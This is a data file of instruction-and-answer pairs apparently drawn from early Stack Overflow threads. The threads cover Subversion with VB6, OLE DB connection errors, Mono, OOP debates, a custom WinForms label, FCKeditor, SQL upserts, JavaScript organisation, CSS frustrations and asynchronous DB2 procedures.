{"instruction": "My team is moving from Visual SourceSafe to Subversion soon, while developing/supporting a legacy project in Visual Basic 6.0, so I have a couple of questions:\n\nWhat's the best tool for Subversion IDE integration in Visual Studio 6? (or is it not worth the trouble...)\nAre there any best practices for using Subversion with Visual Basic 6.0? (file types to ignore, etc.)", "output": "I would agree that Tortoise SVN in Windows Explorer would be the best way to use SVN with VB6.\nThe biggest change you will find migrating to SVN is the idea of \"Check out\" and \"Check in\" aren't exactly the same as \"Update\" and \"Commit\". . . thus, any IDE integration with VB6 is limited because VB6 supports MSSCCI, a check-out/check-in mechanism.  I once used TamTam SVN (http://www.daveswebsite.com/software/tamtamsvn/index.shtml) with Visual Studio 2003, but stopped since I found it limiting.  Merging/branching/blaming, etc. are very powerful features Tortoise SVN provides that weren't in TamTam. Tigris also has http://svnvb6.tigris.org/, but I have not tried it.\nAgain, while you quite possibly get an IDE to work with VB6, I would not recommend it since the greatest strength of migrating to SVN is to break the Source Safe philosophy of check-in/check-out."}
{"instruction": "My team is moving from Visual SourceSafe to Subversion soon, while developing/supporting a legacy project in Visual Basic 6.0, so I have a couple of questions:\n\nWhat's the best tool for Subversion IDE integration in Visual Studio 6? (or is it not worth the trouble...)\nAre there any best practices for using Subversion with Visual Basic 6.0? (file types to ignore, etc.)", "output": "For the server side, VisualSVN Server, is a super simple solution, we are running it in a vmware virtual, and its humming along.\nIf you are a command line guy, I really like the command line interface for svn, I find it less confusing to get to certain actions than tortoise, such as status of the folder. But if you are an explorer fan, tortoise is more than adequate, coming from a source safe world.\nThe main things to ignore are:\n\nReproducable artifacts (dll, pdb, exe)\nEnvironment specific settings (i.e. the settings file for vs, csproj.user file, .suo files)"}
{"instruction": "I'm doing a little bit of work on a horrid piece of software built by Bangalores best.\nIt's written in mostly classic ASP/VbScript, but \"ported\" to ASP.NET, though most of the code is classic ASP style in the ASPX pages :(\nI'm getting this message when it tries to connect to my local database:\nMultiple-step OLE DB operation generated errors. Check each OLE DB status value, if available. No work was done.\nLine 38:    MasterConn = New ADODB.Connection()\nLine 39:    MasterConn.connectiontimeout = 10000\nLine 40:        MasterConn.Open(strDB)\n\nAnybody have a clue what this error means? Its connecting to my local machine (running SQLEXPRESS) using this connection string:\nPROVIDER=MSDASQL;DRIVER={SQL Server};Server=JONATHAN-PC\\SQLEXPRESS\\;DATABASE=NetTraining;Integrated Security=true\n\nWhich is the connection string that it was initially using, I just repointed it at my database.\nUPDATE:\nThe issue was using \"Integrated Security\" with ADO. I changed to using a user account and it connected just fine.", "output": "I ran into this a long time ago with working in ASP.  I found this knowledge base article and it helped me out.  I hope it solves your problem.\nhttp://support.microsoft.com/kb/269495\nIf this doesn't work and everything checks out, then it is probably your connection string.  I would try these steps next:\nRemove:\nDRIVER={SQL Server};\n\nEdit the Provider to this:\nProvider=SQLOLEDB;"}
{"instruction": "My team is moving from Visual SourceSafe to Subversion soon, while developing/supporting a legacy project in Visual Basic 6.0, so I have a couple of questions:\n\nWhat's the best tool for Subversion IDE integration in Visual Studio 6? (or is it not worth the trouble...)\nAre there any best practices for using Subversion with Visual Basic 6.0? (file types to ignore, etc.)", "output": "Since Subversion uses an update/edit/commit cycle (rather than checkin/checkout), you will need to be especially careful with binary files.  Most forms in VB6 consist of two files: MyForm.frm and MyForm.frx.  The *.frx files are binary, and thus cannot be merged.\nGiven that, I would set up Subversion to require \"locking\" on .frx files.  This means that only one person can check the file out at a time.  By doing so, you will enforce that only one developer can modify these files at a time, and it is always clear who that person currently is.  If you don't do this, you are setting yourself up for some major headaches."}
{"instruction": "Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, really compatible enough to just take of and run already written code for Microsoft's runtime?", "output": "MoMA is a great tool for this, as someone else suggested.  The biggest sources of incompatibility these days are applications which DllImport (or P/Invoke) into Win32 libraries.  Some assemblies aren't implemented, but most of them are Windows-only and really wouldn't make sense on Linux.  I think it's fairly safe to say that most ASP.NET applications can run on Mono with limited modifications.\n(Disclosure: I've contributed to Mono itself, as well as written apps that run on top of it.)"}
{"instruction": "Thinking about getting into .net technology project management\nI've had plenty of experience with PHP projects: I'm aware of most of the existing frameworks and libraries, and I've written specs and case studies based on this knowledge.\nWhat should I know about .net?\nWhich top resources would you recommend me to know so I can rapidly learn and later stay up to date on the technology?\nEdit (8.24.08): The answers I got so far essentially discuss being a good PM. Thanks, but this is not what I meant. Any .net essentials would be appreciated.", "output": "This may be old, but should get your started on the high-level overview of the .NET Framework.\nhttp://news.zdnet.co.uk/software/0,1000000121,2134207,00.htm"}
{"instruction": "I am working on a function to establish the entropy of a distribution.  It uses a copula, if any are familiar with that.  I need to sum up the values in the array based on which dimensions are \"cared about.\"\nExample:  Consider the following example... \n\nDimension 0 (across)\n_ _ _ _ _ _ _ _ _ _ _ _ _\n|_ 0 _|_ 0 _|_ 0 _|_ 2 _|  Dimension 1\n|_ 1 _|_ 0 _|_ 2 _|_ 0 _|   (down)\n|_ 0 _|_ 3 _|_ 0 _|_ 6 _|\n|_ 0 _|_ 0 _|_ 0 _|_ 0 _|\n\nI \"care about\" dimension 0 only, and \"don't care\" about the rest (dim 1).\nSumming this array with the above specifications will\n\"collapse\" the \"stacks\" of dimension 1 down to a single 4 x 1 array:\n\n_ _ _ _ _ _ _ _ _ _ _ _ _ \n|_ 1 _|_ 3 _|_ 2 _|_ 8 _|\n\nThis can then be summed, or have any operation performed.\n\nI need to do this with an array of 'n' dimensions, which could feasibly be 20. Also, I need to be able to do this, caring about certain dimensions, and collapsing the rest.  I am having an especially hard time with this because I cant visualize 20 dimensions :p . If anyone could help me set up some c/c++ code to collapse/sum, I would be very very grateful.  \nUpdate:\nJust got home.  Here is some info to answer your questions:\n\nSorry for rolling back the edits, I was hoping when I clicked roll-back it would show me the changes so I could see what I messed up, a bit like wikipedia.  This wasn't the case, as I found out.\n@jeff - What doesnt make sense?  I am using this great service for (what I think is) a legit reason.  I want to get better at my hobby, which is all it is, as I am in high school.  Many of my posts regard implementing a genetic algorithm (This post, sparsearray, rank an array, pointer manipulation).\nI am using a sparse array representation, as it is possible to exceed the number of molecules in the universe using a traditional (dense) array.  For now, the implementation of the sparsearray itself doesnt matter a whole lot, as I am working to make it work with a standard array before going to a sparse representation.  For those who havent seen my previous questions, I am using a binary search tree as the structure to contain the sparse array points, and a \"driver\" function to traverse the tree as necessary, returning whatever the function is designed to do.  This is flexible, so I can accomodate a lot of different methods of accessing the array. \nThe structure is a hypercube, and the number of dimensions is specified at run time, as well as the length of each dimension (which are all the same, as it is a hypercube).\n\nThanks everyone for your imput.", "output": "This could have applications. Lets say you implemented a 2D Conway's Game of Life (which defines a 2D plane, 1 for 'alive', 0 for 'dead') and you stored the Games history for every iteration (which then defines a 3D cube). If you wanted to know how many bacteria there was alive over history, you would use the above algorithm. You could use the same algorithm for a 3D, (and 4D, 5D etc.) version of Game of Life grid.\nI'd say this was a question for recursion, I'm not yet a C programmer but I know it is possible in C. In python,\n\ndef iter_arr(array):\n  sum = 0\n  for i in array:\n    if type(i) == type(list()):\n      sum = sum + iter_arr(i)\n    else:\n      sum = sum + i\n  return sum \n\n\nIterate over each element in array\nIf element is another array, call the function again\nIf element is not array, add it to the sum\nReturn sum\n\nYou would then apply this to each element in the 'cared about' dimension.\nThis is easier in python due to duck-typing though ..."}
{"instruction": "What can be reasons to prevent a class from being inherited? (e.g. using sealed on a c# class)\nRight now I can't think of any.", "output": "The only legitimate use of inheritance is to define a particular case of a base class like, for example, when inherit from Shape to derive Circle. To check this look at the relation in opposite direction: is a Shape a generalization of Circle? If the answer is yes then it is ok to use inheritance.\nSo if you have a class for which there can not be any particular cases that specialize its behavior it should be sealed.\nAlso due to LSP (Liskov Substitution Principle) one can use derived class where base class is expected and this is actually imposes the greatest impact from use of inheritance: code using base class may be given an inherited class and it still has to work as expected. In order to protect external code when there is no obvious need for subclasses you seal the class and its clients can rely that its behavior will not be changed. Otherwise external code needs to be explicitly designed to expect possible changes in behavior in subclasses.\nA more concrete example would be Singleton pattern. You need to seal singleton to ensure one can not break the \"singletonness\"."}
{"instruction": "My team is moving from Visual SourceSafe to Subversion soon, while developing/supporting a legacy project in Visual Basic 6.0, so I have a couple of questions:\n\nWhat's the best tool for Subversion IDE integration in Visual Studio 6? (or is it not worth the trouble...)\nAre there any best practices for using Subversion with Visual Basic 6.0? (file types to ignore, etc.)", "output": "Depending how much you're planning to do on these legacy projects I would consider not switching.\nWhen digging through legacy code it really helps to have all the history and blame. SVN is miles better than VSS, but you'll be losing the history when you switch.\nIf you're going to be a lot of ongoing development in VB6 then it may well be worth switching to SVN, but if you're going to be doing that much going forward is it also worth reviewing the project?\nI have a similar problem, only the legacy projects are in Delphi. Were they in VB6 I think I would consider 'upgrading' them to VB.Net, just for maintainability."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "There's no empirical evidence that suggests that object orientation is a more natural way for people to think about the world. There's some work in the field of psychology of programming that shows that OO is not somehow more fitting than other approaches.\n\nObject-oriented representations do not appear to be universally more usable or less usable.\nIt is not enough to simply adopt OO methods and require developers to use such methods, because that might have a negative impact on developer productivity, as well as the quality of systems developed.\n\nWhich is from \"On the Usability of OO Representations\" from Communications of the ACM Oct. 2000. The articles mainly compares OO against theprocess-oriented approach. There's lots of study of how people who work with the OO method \"think\" (Int. J. of Human-Computer Studies 2001, issue 54, or Human-Computer Interaction 1995, vol. 10 has a whole theme on OO studies), and from what I read, there's nothing to indicate some kind of naturalness to the OO approach that makes it better suited than a more traditional procedural approach."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "In my experience of reviewing code and design of projects I have been through, the value of OOP is not fully realised because alot of developers have not properly conceptualised the object-oriented model in their minds. Thus they do not program with OO design, very often continuing to write top-down procedural code making the classes a pretty flat design. (if you can even call that \"design\" in the first place)\nIt is pretty scary to observe how little colleagues know about what an abstract class or interface are, let alone properly design an inheritance hierarchy to suit the business needs.\nHowever, when good OO design is present, it is just sheer joy reading the code and seeing the code naturally fall into place into intuitive components/classes. I have always perceived system architecture and design like designing the various departments and staff jobs in a company - all are there to accomplish a certain piece of work in the grand scheme of things, emitting the synergy required to propel the organisation/system forward.\nThat, of course, is quite rare unfortunately. Like the ratio of beautifully-designed versus horrendously-designed physical objects in the world, the same can pretty much be said about software engineering and design. Having the good tools at one's disposal does not necessarily confer good practices and results."}
{"instruction": "My team is moving from Visual SourceSafe to Subversion soon, while developing/supporting a legacy project in Visual Basic 6.0, so I have a couple of questions:\n\nWhat's the best tool for Subversion IDE integration in Visual Studio 6? (or is it not worth the trouble...)\nAre there any best practices for using Subversion with Visual Basic 6.0? (file types to ignore, etc.)", "output": "Depending how much you're planning to do on these legacy projects I would consider not switching.\n\nI would really advise you to switch to SVN. I know of a few projects that lost source code because the VSS database became corrupted.\nI think there are tools that perform the migration from SourceSafe to SVN. (Yes-- a quick Google search confirmed it.) That way you wouldn't be losing the revision history."}
{"instruction": "Is there a site for unit testing as RefactorMyCode for refactoring? I think it would be a great help for beginners like me.", "output": "Check out Google's Testing blog: http://googletesting.blogspot.com/\nLots of interesting articles on testing code."}
{"instruction": "Does anybody recommend a design pattern for taking a binary data file, parsing parts of it into objects and storing the resultant data into a database?  \nI think a similar pattern could be used for taking an XML or tab-delimited file and parse it into their representative objects.\nA common data structure would include:\n\n(Header) (DataElement1) (DataElement1SubData1) (DataElement1SubData2)(DataElement2) (DataElement2SubData1) (DataElement2SubData2) (EOF)\n\nI think a good design would include a way to change out the parsing definition based on the file type or some defined metadata included in the header.  So a Factory Pattern would be part of the overall design for the Parser part.", "output": "I fully agree with Orion Edwards, and it is usually the way I approach the problem; but lately I've been starting to see some patterns(!) to the madness.\nFor more complex tasks I usually use something like an interpreter (or a strategy) that uses some builder (or factory) to create each part of the data.\nFor streaming data, the entire parser would look something like an adapter, adapting from a stream object to an object stream (which usually is just a queue).\nFor your example there would probably be one builder for the complete data structure (from head to EOF) which internally uses builders for the internal data elements (fed by the interpreter). Once the EOF is encountered an object would be emitted.\nHowever, objects created in a switch statement in some factory function is probably the simplest way for many lesser tasks. Also, I like keeping my data-objects immutable as you never know when someone shoves concurrency down your throat :)"}
{"instruction": "My company develops several types of applications.  A lot of our business comes from doing multimedia-type apps, typically done in Flash.  However, now that side of the house is starting to migrate towards doing Flex development.\nMost of our other development is done using .NET.  I'm trying to make a push towards doing Silverlight development instead, since it would take better advantage of the .NET developers on staff.  I prefer the Silverlight platform over the Flex platform for the simple fact that Silverlight is all .NET code.  We have more .NET developers on staff than Flash/Flex developers, and most of our Flash/Flex developers are graphic artists (not real programmers).  Only reason they push towards Flex right now is because it seems like the logical step from Flash.\nI've done development using both, and I honestly believe Silverlight is easier to work with.  But I'm trying to convince people who are only Flash developers. \nSo here's my question:  If I'm going to go into a meeting to praise Silverlight, why would a company want to go with Silverlight instead of Flex?  Other than the obvious \"not everyone has Silverlight\", what are the pros and cons for each?", "output": "Another advantage of Flex development is that you can switch to developing desktop applications (Adobe AIR) with the same source code (and same IDE) and distribute them from web. You can check out this\n for the future of Flash platform.\n\nUpdate Q3/2011: Flash 11 supports low-level 3D acceleration, and there are already many frameworks and major engines (Unreal Engine 3, Unity) supporting it. The selling point for the future, however, is that AIR application will work on Windows, Mac, Android, Playbook, and iOS platforms (Linux support has been dropped). With an absolute minimum of hassle between porting between those (at least when you have Adobe CS5.5+).\nUpdate Q2/2015: Silverlight is officially dead. Adobe AIR is alive, but not thriving - it might be useful based on your skills and tool chain. Both Microsoft and Adobe admit that HTML5 is the way to go (whether with AIR or Apache Cordova or Visual Studio)."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "Another alternative would be SproutCore, which is entirely client-side. The project is still in its infancy, however."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "I recommend the Java based Wicket Framework. \nIt's a component based MVC library which is really easy to use and allows to do all the view stuff in the java code (in contrast to using JSPs or templates or whatever in other frameworks)."}
{"instruction": "I don't like the AutoSize property of the Label control. I have a custom Label that draws a fancy rounded border among other things. I'm placing a AutoSize = false in my constructor, however, when I place it in design mode, the property always is True. \nI have overridden other properties with success but this one is happily ignoring me. Does anybody has a clue if this is \"by MS design\"?\nHere's the full source code of my Label in case anyone is interested.\nusing System;\nusing System.ComponentModel;\nusing System.Drawing;\nusing System.Drawing.Drawing2D;\nusing System.Windows.Forms;\n\nnamespace Dentactil.UI.WinControls\n{\n    [DefaultProperty(\"TextString\")]\n    [DefaultEvent(\"TextClick\")]\n    public partial class RoundedLabel : UserControl\n    {\n        private static readonly Color DEFAULT_BORDER_COLOR = Color.FromArgb( 132, 100, 161 );\n        private const float DEFAULT_BORDER_WIDTH = 2.0F;\n        private const int DEFAULT_ROUNDED_WIDTH = 16;\n        private const int DEFAULT_ROUNDED_HEIGHT = 12;\n\n        private Color mBorderColor = DEFAULT_BORDER_COLOR;\n        private float mBorderWidth = DEFAULT_BORDER_WIDTH;\n        private int mRoundedWidth = DEFAULT_ROUNDED_WIDTH;\n        private int mRoundedHeight = DEFAULT_ROUNDED_HEIGHT;\n\n        public event EventHandler TextClick;\n\n        private Padding mPadding = new Padding(8);\n\n        public RoundedLabel()\n        {\n            InitializeComponent();\n        }\n\n        public Cursor TextCursor\n        {\n            get { return lblText.Cursor; }\n            set { lblText.Cursor = value; }\n        }\n\n        public Padding TextPadding\n        {\n            get { return mPadding; }\n            set\n            {\n                mPadding = value;\n                UpdateInternalBounds();\n            }\n        }\n\n        public ContentAlignment TextAlign\n        {\n            get { return lblText.TextAlign; }\n            set { lblText.TextAlign = value; }\n        }\n\n        public string TextString\n        {\n            get { return lblText.Text; }\n            set { lblText.Text = value; }\n        }\n\n        public override Font Font\n        {\n            get { return base.Font; }\n            set\n            {\n                base.Font = value;\n                lblText.Font = value;\n            }\n        }\n\n        public override Color ForeColor\n        {\n            get { return base.ForeColor; }\n            set\n            {\n                base.ForeColor = value;\n                lblText.ForeColor = value;\n            }\n        }\n\n        public Color BorderColor\n        {\n            get { return mBorderColor; }\n            set\n            {\n                mBorderColor = value;\n                Invalidate();\n            }\n        }\n\n        [DefaultValue(DEFAULT_BORDER_WIDTH)]\n        public float BorderWidth\n        {\n            get { return mBorderWidth; }\n            set\n            {\n                mBorderWidth = value;\n                Invalidate();\n            }\n        }\n\n        [DefaultValue(DEFAULT_ROUNDED_WIDTH)]\n        public int RoundedWidth\n        {\n            get { return mRoundedWidth; }\n            set\n            {\n                mRoundedWidth = value;\n                Invalidate();\n            }\n        }\n\n        [DefaultValue(DEFAULT_ROUNDED_HEIGHT)]\n        public int RoundedHeight\n        {\n            get { return mRoundedHeight; }\n            set\n            {\n                mRoundedHeight = value;\n                Invalidate();\n            }\n        }\n\n        private void UpdateInternalBounds()\n        {\n            lblText.Left = mPadding.Left;\n            lblText.Top = mPadding.Top;\n\n            int width = Width - mPadding.Right - mPadding.Left;\n            lblText.Width = width > 0 ? width : 0;\n\n            int heigth = Height - mPadding.Bottom - mPadding.Top;\n            lblText.Height = heigth > 0 ? heigth : 0;\n        }\n\n        protected override void OnLoad(EventArgs e)\n        {\n            UpdateInternalBounds();\n            base.OnLoad(e);\n        }\n\n        protected override void OnPaint(PaintEventArgs e)\n        {\n            SmoothingMode smoothingMode = e.Graphics.SmoothingMode;\n            e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;\n\n            int roundedWidth = RoundedWidth > (Width - 1)/2 ? (Width - 1)/2 : RoundedWidth;\n            int roundedHeight = RoundedHeight > (Height - 1)/2 ? (Height - 1)/2 : RoundedHeight;\n\n            GraphicsPath path = new GraphicsPath();\n            path.AddLine(0, roundedHeight, 0, Height - 1 - roundedHeight);\n            path.AddArc(new RectangleF(0, Height - 1 - 2*roundedHeight, 2*roundedWidth, 2*roundedHeight), 180, -90);\n            path.AddLine(roundedWidth, Height - 1, Width - 1 - 2*roundedWidth, Height - 1);\n            path.AddArc(new RectangleF(Width - 1 - 2*roundedWidth, Height - 1 - 2*roundedHeight, 2*roundedWidth, 2*roundedHeight), 90, -90);\n            path.AddLine(Width - 1, Height - 1 - roundedHeight, Width - 1, roundedHeight);\n            path.AddArc(new RectangleF(Width - 1 - 2*roundedWidth, 0, 2*roundedWidth, 2*roundedHeight), 0, -90);\n            path.AddLine(Width - 1 - roundedWidth, 0, roundedWidth, 0);\n            path.AddArc(new RectangleF(0, 0, 2*roundedWidth, 2*roundedHeight), -90, -90);\n\n            e.Graphics.DrawPath(new Pen(new SolidBrush(BorderColor), BorderWidth), path);\n\n            e.Graphics.SmoothingMode = smoothingMode;\n            base.OnPaint(e);\n        }\n\n        protected override void OnResize(EventArgs e)\n        {\n            UpdateInternalBounds();\n            base.OnResize(e);\n        }\n\n        private void lblText_Click(object sender, EventArgs e)\n        {\n            if (TextClick != null)\n            {\n                TextClick(this, e);\n            }\n        }\n    }\n}\n\n(there are some issues with Stack Overflow's markup and the Underscore, but it's easy to follow the code).\n\nI have actually removed that override some time ago when I saw that it wasn't working. I'll add it again now and test. Basically I want to replace the Label with some new label called: IWillNotAutoSizeLabel ;)\nI basically hate the autosize property \"on by default\".", "output": "Your problem could be that you're not actually overriding Autosize in your code (ie, in the same way that you're overriding Font or ForeColor)."}
{"instruction": "I am looking for a Web Framework to move windows based applications to the web.\nThe main requirements to WF are the following:\n\nunit tests support\ndesktop and mobile browsers support\nlong term viability\nmaturity of the framework", "output": "I've had surprising success using Drupal as a web app framework.  It's highly extensible - pretty much every default behaviour can be overridden easily via modules, and it's a pretty blank slate to start with as well.\nDrupal 7 has unit testing built-in, and earlier versions can do it easily via a plugin."}
{"instruction": "FCKeditor has InsertHtml API (JavaScript API document) that inserts HTML in the current cursor position. How do I insert at the very end of the document?\nDo I need to start browser sniffing with something like this\nif ( element.insertAdjacentHTML )    // IE \n    element.insertAdjacentHTML( 'beforeBegin',  html ) ; \nelse                                // Gecko \n{ \n    var oRange = document.createRange() ; \n    oRange.setStartBefore( element ) ; \n    var oFragment = oRange.createContextualFragment( html ); \n    element.parentNode.insertBefore( oFragment,  element ) ; \n} \n\nor is there a blessed way that I missed?\nEdit: Of course, I can rewrite the whole HTML, as answers suggest, but I cannot believe that is the \"blessed\" way. That means that the browser should destroy whatever it has and re-parse the document from scratch. That cannot be good. For example, I expect that to break the undo stack.", "output": "It looks like you could use a combination of GetHTML and SetHTML to get the current contents, append your html and reinsert everything into the editor. Although it does say \n\nNote that when using this method, you will lose any listener that you may have previously registered on the editor.EditorDocument.\n\nHope that helps!"}
{"instruction": "I've written a stored proc that will do an update if a record exists, otherwise it will do an insert. It looks something like this:\nupdate myTable set Col1=@col1, Col2=@col2 where ID=@ID\nif @@rowcount = 0\ninsert into myTable (Col1, Col2) values (@col1, @col2)\n\nMy logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take place.\nThe alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert. This I considered inefficient because if you are to do an update it will cause 2 selects (the first explicit select call and the second implicit in the where of the update). If the proc were to do an insert then there'd be no difference in efficiency.\nIs my logic sound here?\nIs this how you would combine an insert and update into a stored proc?", "output": "If to be used with SQL Server 2000/2005 the original code needs to be enclosed in transaction to make sure that data remain consistent in concurrent scenario.\nBEGIN TRANSACTION Upsert\nupdate myTable set Col1=@col1, Col2=@col2 where ID=@ID\nif @@rowcount = 0\ninsert into myTable (Col1, Col2) values (@col1, @col2)\nCOMMIT TRANSACTION Upsert\n\nThis will incur additional performance cost, but will ensure data integrity.\nAdd, as already suggested, MERGE should be used where available."}
{"instruction": "What are some standard practices for managing a medium-large JavaScript application? My concerns are both speed for browser download and ease and maintainability of development.\nOur JavaScript code is roughly \"namespaced\" as:\nvar Client = {\n   var1: '',\n   var2: '',\n\n   accounts: {\n      /* 100's of functions and variables */\n   },\n\n   orders: {\n      /* 100's of functions and variables and subsections */\n   }\n\n   /* etc, etc  for a couple hundred kb */\n}\n\nAt the moment, we have one (unpacked, unstripped, highly readable) JavaScript file to handle all the business logic on the web application. In addition, there is jQuery and several jQuery extensions. The problem we face is that it takes forever to find anything in the JavaScript code and the browser still has a dozen files to download.\nIs it common to have a handful of \"source\" JavaScript files that gets \"compiled\" into one final, compressed JavaScript file? Any other handy hints or best practices?", "output": "Read the code of other (good) javascript apps and see how they handle things.  But I start out with a file per class.  But once its ready for production, I would combine the files into one large file and minify.\nThe only reason, I would not combine the files, is if I didn't need all the files on all the pages."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "What I found works best is to really learn CSS. I mean really learn CSS.\nIt can be a confusing language to learn, but if you read enough about it and practice, eventually you'll learn the best way to do things.\nThe key is to do it enough that it comes natural. CSS can be very elegant if you know what you want to do before you start and you have enough experience to do it.\nGranted, it is also a major PITA to do sometimes, but even cross-browser issues aren't so bad if you really practice at it and learn what works and what doesn't, and how to get around problems.\nAll it takes is practice and in time you can become good at it."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "You can always use a template engine to add variables and caclulated fields to your CSS files."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "Then comes the multiple browser issue\n\nThere is this that helps remove some inconsistencies from IE. You can also use jQuery to add some selectors via javascript.\nI agree with Dan, learn it and it's not so much of a problem, even fun."}
{"instruction": "Is it possible to call a stored prodcedure from another stored procedure asynchronously?\nEdit: Specifically I'm working with a DB2 database.", "output": "Executive summary:  Yes, if your database has a message queue service.\nYou can push a message onto a queue and the queue processor will consume it asynchronously.\n\nOracle: queues\nSql Server: service broker\nDB2: event broker\n\nFor \"pure\" stored procedure languages (PL/Sql or T-Sql) the answer is no, since it works against the fundamental transaction model most databases have.\nHowever, if your database has a queuing mechanism, you can use that to get the same result."}
{"instruction": "Is it possible to call a stored prodcedure from another stored procedure asynchronously?\nEdit: Specifically I'm working with a DB2 database.", "output": "With MS Sql Server 2005, try the Service Broker and/or CLR stored procedures.  I don't think there's anything built directly into TSQL."}
{"instruction": "Let me make something quite clear.\nI. Hate. CSS.\nIt is a never-ending nightmare. Every minor layout change feels like a hack. Solutions to problems seem to often involve jiggering numbers around like some chef trying to work out exactly how much nutmeg to put in his soon-to-be famous rice pudding. Then comes the multiple browser issue, the multiple resolution issues..\n.. to cut a long story short, it's a pain. A PITA, if you will.\nMany frameworks seek to abstract away from HTML (custom tags, JSFs component system) in an effort to make dealing with that particular kettle of fish easier.\nIs there anything you folks have used that has a similar concept applied to CSS? Something that does a bunch of cross-browser magic for you, supports like variables (why do I have to type #3c5c8d every time I want that colour), supports caclulated fields (which are 'compiled' into CSS and JS), etc.\nAlternatively, am I even thinking about this correctly? Am I trying to push a very square block through a very round hole?", "output": "The key to a real understanding of CSS (and the browser headaches) is a solid understanding of the box model used by the CSS Standards, and the incorrect model used by some browsers. Once you have that down and start learning selectors you will get away from browser specific properties and CSS will become something you look forward to."}
{"instruction": "Is it possible to call a stored prodcedure from another stored procedure asynchronously?\nEdit: Specifically I'm working with a DB2 database.", "output": "It sounds like you need to put some scheduled jobs in place with Cron (or windows equiv). You could use the initial stored proc call to set some kind of flag in the DB, which is then checked periodically by a cron job. If you need to have a specific delay before the 2nd job executes, you should be able to do that by having the task scheduled by the cron job."}
